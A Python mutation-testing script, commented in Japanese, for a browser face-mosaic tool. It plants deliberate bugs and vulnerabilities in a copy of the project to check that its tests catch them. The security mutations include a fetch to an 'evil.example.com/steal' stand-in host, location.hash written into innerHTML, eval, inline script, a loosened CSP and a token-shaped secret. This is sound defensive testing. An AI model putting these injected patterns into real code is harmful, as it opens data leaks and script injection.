#!/usr/bin/env python3
"""変異テスト: プロジェクトを複製し、故意にバグ・脆弱性を1つずつ仕込んで、該当するテストが失敗する（=検出できる）ことを確認する。
   「テストが通る」ことではなく「テストが問題を見つけられる」ことの確認。1つでも見逃しがあれば終了コード1。
   使い方: python3 tests/mutation_check.py        （Node.js と jsdom が必要。約5〜10分）"""
import os, shutil, subprocess, sys, tempfile
ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
ENV = dict(os.environ)
if os.path.isdir(os.path.join(ROOT, "node_modules")): ENV["NODE_PATH"] = os.path.join(ROOT, "node_modules")
WORK = tempfile.mkdtemp(prefix="fm_mut_")
BASE = os.path.join(WORK, "base")
shutil.copytree(ROOT, BASE, ignore=shutil.ignore_patterns("node_modules", ".git"))
G = ["--expose-gc"]

def sub(path, old, new):
    def f(d):
        p = os.path.join(d, path); s = open(p, encoding="utf-8").read(); assert old in s, (path, old[:50])
        open(p, "w", encoding="utf-8").write(s.replace(old, new, 1))
    return f
def append(path, text):
    def f(d): open(os.path.join(d, path), "a", encoding="utf-8").write(text)
    return f
def write(path, data, mode="w"):
    def f(d): open(os.path.join(d, path), mode).write(data)
    return f

CORE_SIZE = "if (bw < 16.0 || bh < 16.0) continue;\n      const aspect = bw / bh;\n      if (aspect < 0.50 || aspect > 1.35) continue;\n\n      let required"
M = []
def m(name, fn, test, flags=()): M.append((name, fn, test, list(flags)))

# --- 画面の整合性 ---
m("html: 未定義のクラス名", sub("index.html", 'class="app" id="app"', 'class="app zzz-undefined" id="app"'), "test_markup.js")
m("html: idの取り違え", sub("index.html", 'id="exportBtn"', 'id="exportBtnX"'), "test_markup.js")
m("html: id重複", sub("index.html", 'id="cancelBtn"', 'id="exportBtn"'), "test_markup.js")
m("html: buttonのtype抜け", sub("index.html", '<button type="button" class="subtle" id="diagBtn">', '<button class="subtle" id="diagBtn">'), "test_markup.js")
# --- セキュリティ ---
m("js: eval の混入", append("js/app.js", "\neval('1');\n"), "test_security.js")
m("js: innerHTML の混入", append("js/app.js", "\ndocument.body.innerHTML = location.hash;\n"), "test_security.js")
m("js: localStorage の使用", append("js/core.js", "\nlocalStorage.setItem('a','b');\n"), "test_security.js")
m("js: 外部サイトへの通信", append("js/worker.js", "\nfetch('https://evil.example.com/steal');\n"), "test_security.js")
m("html: CSP に unsafe-inline", sub("index.html", "script-src 'self';", "script-src 'self' 'unsafe-inline';"), "test_security.js")
m("html: CSP の connect-src を緩める", sub("selfcheck.html", "connect-src 'self';", "connect-src *;"), "test_security.js")
m("html: インラインスクリプト", sub("index.html", "</body>", "<script>alert(1)</script></body>"), "test_security.js")
m("html: onclick 属性", sub("index.html", 'id="diagBtn"', 'id="diagBtn" onclick="x()"'), "test_security.js")
m("html: 外部CDNの読み込み", sub("index.html", '<link rel="stylesheet" href="app.css">', '<link rel="stylesheet" href="app.css"><link rel="stylesheet" href="https://cdn.example.com/x.css">'), "test_security.js")
m("html: iframe の追加", sub("index.html", "</body>", "<iframe src='x'></iframe></body>"), "test_security.js")
m("css: style.css を1文字改変", sub("style.css", "--uguisu: #697b43;", "--uguisu: #697b44;"), "test_security.js")
m("台帳が古い(台帳更新なしで変更)", append("js/app.js", "\n// 変更\n"), "test_security.js")
m("vendor: 未知のスクリプト", write("vendor/evil.js", "x"), "test_security.js")
m("vendor: opencv.js を改変", write("vendor/opencv.js", "\n//x", "a"), "test_security.js")
def flip_model(d):
    p = os.path.join(d, "models/face_detection_yunet_2026may.onnx"); b = bytearray(open(p, "rb").read()); b[100] ^= 1; open(p, "wb").write(bytes(b))
m("モデル: 1バイト改変", flip_model, "test_security.js")
m("Actions の追加", lambda d: (os.makedirs(d + "/.github/workflows"), open(d + "/.github/workflows/x.yml", "w").write("on: push")), "test_security.js")
m(".nojekyll の欠落", lambda d: os.remove(d + "/.nojekyll"), "test_security.js")
m("package.json に postinstall", sub("package.json", '"scripts": {', '"scripts": {\n    "postinstall": "node x.js",'), "test_security.js")
m("秘密情報の混入", append("SECURITY.md", "\n" + "ghp_" + "abcdefghijklmnopqrstuvwxyz0123456789" + "\n"), "test_security.js")   # ソースに実在の形式の文字列を残さないよう、実行時に組み立てる
m("フレーム検査をDOM操作の後ろへ", sub("js/app.js", "if (FMCore.isFramed(window)) {", "document.getElementById('app');\n  if (FMCore.isFramed(window)) {"), "test_security.js")
m("worker: 検証の前に処理", sub("js/worker.js", "msg = FMCore.validateRequest(ev.data);", "msg = ev.data;"), "test_security.js")
# --- アルゴリズム（Python 実装との一致） ---
m("追跡: 確定フレーム数を変更", sub("js/core.js", "TRACK_CONFIRM_FRAMES: 2,", "TRACK_CONFIRM_FRAMES: 3,"), "test_parity.js")
m("検出: 小さい顔の信頼度を緩める", sub("js/core.js", "DYN_SMALL_FACE_MIN_CONF: 0.55,", "DYN_SMALL_FACE_MIN_CONF: 0.30,"), "test_parity.js")
m("検出: 端の顔の信頼度を緩める", sub("js/core.js", "DYN_EDGE_MIN_CONF: 0.60,", "DYN_EDGE_MIN_CONF: 0.40,"), "test_parity.js")
m("検出: 粗スケールの信頼度を緩める", sub("js/core.js", "DYN_COARSE_MIN_CONF: 0.60,", "DYN_COARSE_MIN_CONF: 0.45,"), "test_parity.js")
m("検出: 大きい顔の発動サイズを変更", sub("js/core.js", "DYN_COARSE_LARGE_FACE_TRIGGER: 200.0,", "DYN_COARSE_LARGE_FACE_TRIGGER: 150.0,"), "test_parity.js")
m("検出: マージのIoUを変更", sub("js/core.js", "DYN_MERGE_IOU: 0.35,", "DYN_MERGE_IOU: 0.50,"), "test_parity.js")
m("検出: 包含マージを変更", sub("js/core.js", "DYN_MERGE_CONTAINMENT: 0.70,", "DYN_MERGE_CONTAINMENT: 0.90,"), "test_parity.js")
m("検出: 縦横比の上限を変更", sub("js/core.js", "if (aspect < 0.50 || aspect > 1.35) continue;\n\n      let required", "if (aspect < 0.50 || aspect > 1.50) continue;\n\n      let required"), "test_parity.js")
m("検出: 最小サイズ(幅・高さ) 16→12", sub("js/core.js", CORE_SIZE, CORE_SIZE.replace("16.0 || bh < 16.0", "12.0 || bh < 12.0")), "test_parity.js")
m("検出: 最小サイズ(幅だけ) 16→20", sub("js/core.js", CORE_SIZE, CORE_SIZE.replace("bw < 16.0", "bw < 20.0")), "test_parity.js")
m("検出: 比較演算子 >= を >", sub("js/core.js", "ccx >= validW || ccy >= validH", "ccx > validW || ccy > validH"), "test_parity.js")
m("検出: パディング領域の除外を外す", sub("js/core.js", "if (ccx < 0.0 || ccy < 0.0 || ccx >= validW || ccy >= validH) continue;", ""), "test_parity.js")
m("検出: パディング率を変更", sub("js/core.js", "FACE_PADDING_X: 0.10,", "FACE_PADDING_X: 0.12,"), "test_parity.js")
m("モザイク: 縮小率を変更", sub("js/core.js", "LARGE_FACE_MOSAIC_SCALE: 0.06,", "LARGE_FACE_MOSAIC_SCALE: 0.08,"), "test_parity.js")
m("モザイク: 補間方法を変更", sub("js/core.js", "cv.resize(small, big, new cv.Size(rw, rh), 0, 0, cv.INTER_NEAREST);", "cv.resize(small, big, new cv.Size(rw, rh), 0, 0, cv.INTER_LINEAR);"), "test_parity.js")
m("丸め: 偶数丸めをやめる", sub("js/core.js", "const f = Math.floor(x);\n    const d = x - f;\n    if (d < 0.5) return f;\n    if (d > 0.5) return f + 1;\n    return f % 2 === 0 ? f : f + 1;", "return Math.round(x);"), "test_parity.js")
# --- パイプライン（実モデル・Mat） ---
m("パイプライン: 32の倍数への埋め込みをやめる", sub("js/pipeline.js", "if (ph !== h || pw !== w) {", "if (false) {"), "test_realmodel.js", G)
m("パイプライン: BGR変換を誤る", sub("js/pipeline.js", "cv.cvtColor(this.rgba, this.bgr, cv.COLOR_RGBA2BGR);", "cv.cvtColor(this.rgba, this.bgr, cv.COLOR_RGBA2RGB);"), "test_realmodel.js", G)
m("Mat解放漏れ: faces", sub("js/pipeline.js", "      faces.delete();\n      if (tmpPad)", "      if (tmpPad)"), "test_pipeline.js", G)
m("Mat解放漏れ: パディング一時Mat", sub("js/pipeline.js", "      if (tmpPad) tmpPad.delete();", ""), "test_realmodel.js", G)
m("Mat解放漏れ: roi", sub("js/core.js", "roi.delete(); small.delete(); big.delete();", "small.delete(); big.delete();"), "test_pipeline.js", G)
m("Mat解放漏れ: dispose", sub("js/pipeline.js", 'for (const k of ["rgba", "bgr", "small", "pad", "coarseMat"]) {', 'for (const k of ["rgba", "bgr", "small", "pad"]) {'), "test_pipeline.js", G)
m("Mat解放漏れ: 自己診断の zeros", sub("js/pipeline.js", "try { inferMat(cv, core, primary, z, null); } finally { z.delete(); }", "try { inferMat(cv, core, primary, z, null); } finally { }"), "test_realmodel.js", G)
# --- Worker ---
m("Worker: モデルのハッシュ確認を外す", sub("js/worker.js", "if (modelBytes.byteLength !== C.MODEL_SIZE || (await sha256Hex(modelBytes)) !== C.MODEL_SHA256) {", "if (false) {"), "test_worker.js", G)
m("Worker: 品質の選択肢検証を外す", sub("js/core.js", 'if (!QUALITIES.includes(msg.quality)) throw new Error("出力品質の指定が不正です。");', ""), "test_worker.js", G)
m("Worker: 解像度上限を外す", sub("js/worker.js", "vtrack.displayWidth * vtrack.displayHeight > C.MAX_PIXELS", "false"), "test_worker.js", G)
# --- 画面 ---
m("画面: ダウンロード名の無害化をやめる", sub("js/app.js", "S.outputName = FMCore.safeBaseName(file.name);", "S.outputName = file.name.replace(/\\.[^.]*$/, '');"), "test_ui_jsdom.js")
m("画面: ファイル名表示の無害化をやめる", sub("js/app.js", 'const shownName = FMCore.sanitizeName(file.name) || "video";', "const shownName = file.name;"), "test_ui_jsdom.js")
m("画面: ウォッチドッグを無効化", sub("js/app.js", "if (S.processing && S.lastActivity && Date.now() - S.lastActivity > WATCHDOG_MS) {", "if (false) {"), "test_ui_jsdom.js")
m("画面: モデルのサイズ確認をやめる", sub("js/app.js", "if (!buf || buf.byteLength !== C.MODEL_SIZE)", "if (!buf)"), "test_ui_jsdom.js")
m("画面: 二重クリック防止を外す", sub("js/app.js", 'if (!S.file || S.processing || S.engine !== "ready") return;\n    hideBanner(); clearResult();', "hideBanner(); clearResult();"), "test_ui_jsdom.js")
m("画面: フレーム検査を無効化", sub("js/app.js", "if (FMCore.isFramed(window)) {", "if (false) {"), "test_ui_jsdom.js")
# --- 診断ページ ---
m("診断: CSP の実効確認を外す", sub("js/selfcheck.js", 'dir && String(dir).startsWith("connect-src")', "true"), "test_selfcheck_jsdom.js")
m("診断: 整合性の照合を外す", sub("js/selfcheck.js", "else if ((await sha256Hex(buf)) !== meta.sha256) bad.push(", "else if (false) bad.push("), "test_selfcheck_jsdom.js")

missed = []
for i, (name, fn, test, flags) in enumerate(M, 1):
    d = os.path.join(WORK, f"m{i}")
    shutil.copytree(BASE, d)
    try:
        fn(d)
        r = subprocess.run(["node", *flags, f"tests/{test}"], cwd=d, capture_output=True, text=True, env=ENV, timeout=900)
        caught = r.returncode != 0 or any(l.startswith("FAIL") for l in r.stdout.splitlines())
    except subprocess.TimeoutExpired:
        caught = True
    print(f"[{i:2}/{len(M)}] {'検出' if caught else '★見逃し★'}  {name}  ({test})", flush=True)
    if not caught: missed.append(name)
    shutil.rmtree(d, ignore_errors=True)
shutil.rmtree(WORK, ignore_errors=True)
print(f"\n変異 {len(M)} 種類のうち、検出 {len(M) - len(missed)} / 見逃し {len(missed)}")
sys.exit(1 if missed else 0)
